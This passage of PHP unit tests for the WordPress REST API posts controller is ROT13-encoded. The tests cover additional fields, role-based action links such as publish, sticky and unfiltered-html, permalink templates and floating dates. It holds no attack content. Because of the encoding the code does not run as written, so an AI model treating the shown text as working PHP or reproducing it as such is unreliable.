		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregRdhnyf( 123, trg_cbfg_zrgn( $cbfg_vq, 'zl_phfgbz_vag', gehr ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
				'gvgyr'         => 'uryyb',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregRdhnyf( 123, $erfcbafr->qngn['zl_phfgbz_vag'] );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	/**
	 * @gvpxrg 45220
	 */
	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba_ahyy_fpurzn() {
		ertvfgre_erfg_svryq(
			'cbfg',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => ahyy,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => ahyy,
			)
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		// 'zl_phfgbz_vag' fubhyq nccrne orpnhfr ?_svryqf= vfa'g frg.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		// 'zl_phfgbz_vag' fubhyq nccrne orpnhfr vg'f cerfrag va ?_svryqf=.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( '_svryqf', 'gvgyr,zl_phfgbz_vag' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		// 'zl_phfgbz_vag' fubhyq abg nccrne orpnhfr vg'f abg cerfrag va ?_svryqf=.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( '_svryqf', 'gvgyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlAbgUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba grfg_nqqvgvbany_svryq_hcqngr_reebef() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'cbfg',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Purpx sbe reebe ba hcqngr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 'ergheaReebe',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea trg_cbfg_zrgn( $erfcbafr_qngn['vq'], $svryq_anzr, gehr );
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $cbfg, $svryq_anzr ) {
		vs ( 'ergheaReebe' === $inyhr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_cnenz', 'Grfgvat na reebe.', neenl( 'fgnghf' => 400 ) );
		}
		hcqngr_cbfg_zrgn( $cbfg->VQ, $svryq_anzr, $inyhr );
	}

	choyvp shapgvba grfg_choyvfu_npgvba_yqb_ertvfgrerq() {
		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-choyvfu' ) );

		$guvf->nffregPbhag( 1, $choyvfu, 'YQB sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_fgvpxl_npgvba_yqb_ertvfgrerq_sbe_cbfgf() {
		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-fgvpxl' ) );

		$guvf->nffregPbhag( 1, $choyvfu, 'YQB sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_fgvpxl_npgvba_yqb_abg_ertvfgrerq_sbe_aba_cbfgf() {
		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cntrf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-fgvpxl' ) );

		$guvf->nffregPbhag( 0, $choyvfu, 'YQB sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_nhgube_npgvba_yqb_ertvfgrerq_sbe_cbfg_glcrf_jvgu_nhgube_fhccbeg() {
		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube' ) );

		$guvf->nffregPbhag( 1, $choyvfu, 'YQB sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_nhgube_npgvba_yqb_abg_ertvfgrerq_sbe_cbfg_glcrf_jvgubhg_nhgube_fhccbeg() {
		erzbir_cbfg_glcr_fhccbeg( 'cbfg', 'nhgube' );

		// Er-vavgvnyvmr gur pbagebyyre gb pnpur-ohfg fpurznf sebz cevbe grfg ehaf.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube' ) );

		$guvf->nffregPbhag( 0, $choyvfu, 'YQB sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_grez_npgvba_yqbf_ertvfgrerq() {
		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$eryf = neenl_syvc( jc_yvfg_cyhpx( $fpurzn['yvaxf'], 'ery' ) );

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-pngrtbevrf', $eryf );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-pngrtbevrf', $eryf );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-gntf', $eryf );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-gntf', $eryf );

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-cbfg_sbezng', $eryf );
		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-cbfg_sbezng', $eryf );
		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-ani_zrah', $eryf );
		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-ani_zrah', $eryf );
	}

	choyvp shapgvba grfg_npgvba_yvaxf_bayl_ninvynoyr_va_rqvg_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'ivrj' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-choyvfu', $yvaxf );
	}

	choyvp shapgvba grfg_choyvfu_npgvba_yvax_rkvfgf_sbe_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-choyvfu', $yvaxf );
	}

	choyvp shapgvba grfg_choyvfu_npgvba_yvax_qbrf_abg_rkvfg_sbe_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$pbagevohgbe_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-choyvfu', $yvaxf );
	}

	choyvp shapgvba grfg_fgvpxl_npgvba_rkvfgf_sbe_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-fgvpxl', $yvaxf );
	}

	choyvp shapgvba grfg_fgvpxl_npgvba_qbrf_abg_rkvfg_sbe_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-fgvpxl', $yvaxf );
	}

	choyvp shapgvba grfg_fgvpxl_npgvba_qbrf_abg_rkvfg_sbe_aba_cbfg_cbfgf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vq,
				'cbfg_glcr'   => 'cntr',
			)
		);
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-fgvpxl', $yvaxf );
	}


	choyvp shapgvba grfg_nffvta_nhgube_npgvba_rkvfgf_sbe_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube', $yvaxf );
	}

	choyvp shapgvba grfg_nffvta_nhgube_npgvba_qbrf_abg_rkvfg_sbe_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube', $yvaxf );
	}

	choyvp shapgvba grfg_nffvta_nhgube_npgvba_qbrf_abg_rkvfg_sbe_cbfg_glcrf_jvgubhg_nhgube_fhccbeg() {
		erzbir_cbfg_glcr_fhccbeg( 'cbfg', 'nhgube' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr();
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube', $yvaxf );
	}

	choyvp shapgvba grfg_perngr_grez_npgvba_rkvfgf_sbe_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-pngrtbevrf', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-gntf', $yvaxf );
		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-cbfg_sbezng', $yvaxf );
	}

	choyvp shapgvba grfg_perngr_grez_npgvba_aba_uvrenepuvpny_rkvfgf_sbe_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-gntf', $yvaxf );
	}

	choyvp shapgvba grfg_perngr_grez_npgvba_uvrenepuvpny_qbrf_abg_rkvfgf_sbe_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-perngr-pngrtbevrf', $yvaxf );
	}

	choyvp shapgvba grfg_nffvta_grez_npgvba_rkvfgf_sbe_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$pbagevohgbe_vq,
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-pngrtbevrf', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-nffvta-gntf', $yvaxf );
	}

	choyvp shapgvba grfg_nffvta_hasvygrerq_ugzy_npgvba_fhcrenqzva() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy', $yvaxf );
	}

	choyvp shapgvba grfg_nffvta_hasvygrerq_ugzy_npgvba_rqvgbe() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();
		// Rqvgbef pna bayl hasvygrerq ugzy ba fvatyr fvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy', $yvaxf );
		} ryfr {
			$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy', $yvaxf );
		}
	}

	choyvp shapgvba grfg_nffvta_hasvygrerq_ugzy_npgvba_nhgube() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();
		// Nhgubef pna'g rire hasvygrerq ugzy.
		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy', $yvaxf );
	}

	choyvp shapgvba grfg_trarengrq_creznyvax_grzcyngr_trarengrq_fyht_sbe_aba_ivrjnoyr_cbfgf() {
		ertvfgre_cbfg_glcr(
			'cevingr-cbfg',
			neenl(
				'ynory'              => 'Cevingr Cbfgf',
				'fhccbegf'           => neenl( 'gvgyr', 'rqvgbe', 'nhgube' ),
				'fubj_va_erfg'       => gehr,
				'choyvpyl_dhrelnoyr' => snyfr,
				'choyvp'             => gehr,
				'erfg_onfr'          => 'cevingr-cbfg',
			)
		);
		perngr_vavgvny_erfg_ebhgrf();

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Creznyvax Grzcyngr',
				'cbfg_glcr'   => 'cevingr-cbfg',
				'cbfg_fgnghf' => 'qensg',
			)
		);

		// Arvgure 'creznyvax_grzcyngr' naq 'trarengrq_fyht' ner rkcrpgrq sbe guvf cbfg glcr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cevingr-cbfg/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'creznyvax_grzcyngr', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'trarengrq_fyht', $qngn );
	}

	choyvp shapgvba grfg_trarengrq_creznyvax_grzcyngr_trarengrq_fyht_sbe_cbfgf() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );
		$rkcrpgrq_creznyvax_grzcyngr = genvyvatfynfuvg( ubzr_hey( '/%cbfganzr%/' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Creznyvax Grzcyngr',
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'qensg',
			)
		);

		// Obgu 'creznyvax_grzcyngr' naq 'trarengrq_fyht' ner rkcrpgrq sbe pbagrkg=rqvg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $rkcrpgrq_creznyvax_grzcyngr, $qngn['creznyvax_grzcyngr'] );
		$guvf->nffregFnzr( 'creznyvax-grzcyngr', $qngn['trarengrq_fyht'] );

		// Arvgure 'creznyvax_grzcyngr' naq 'trarengrq_fyht' ner rkcrpgrq sbe pbagrkg=ivrj.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'creznyvax_grzcyngr', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'trarengrq_fyht', $qngn );
	}

	/**
	 * @gvpxrg 39953
	 */
	choyvp shapgvba grfg_chggvat_fnzr_choyvfu_qngr_qbrf_abg_erzbir_sybngvat_qngr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$gvzr = tzqngr( 'L-z-q U:v:f' );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_qngr'   => $gvzr,
			)
		);

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		$trg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$trg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$trg      = erfg_trg_freire()->qvfcngpu( $trg );
		$trg_obql = $trg->trg_qngn();

		$chg = arj JC_ERFG_Erdhrfg( 'CHG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$chg->frg_obql_cnenzf( $trg_obql );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $chg );
		$obql     = $erfcbafr->trg_qngn();

		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( $trg_obql['qngr'] ), fgegbgvzr( $obql['qngr'] ), 2, 'Gur qngrf fubhyq or rdhny' );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( $trg_obql['qngr_tzg'] ), fgegbgvzr( $obql['qngr_tzg'] ), 2, 'Gur qngrf fubhyq or rdhny' );

		$guvf->nffregFnzr( '0000-00-00 00:00:00', trg_cbfg( $cbfg->VQ )->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 39953
	 */
	choyvp shapgvba grfg_chggvat_qvssrerag_choyvfu_qngr_erzbirf_sybngvat_qngr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$gvzr     = tzqngr( 'L-z-q U:v:f' );
		$arj_gvzr = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '+1 jrrx' ) );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_qngr'   => $gvzr,
			)
		);

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		$trg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$trg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$trg      = erfg_trg_freire()->qvfcngpu( $trg );
		$trg_obql = $trg->trg_qngn();

		$chg = arj JC_ERFG_Erdhrfg( 'CHG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$chg->frg_obql_cnenzf(
			neenl_zretr(
				$trg_obql,
				neenl(
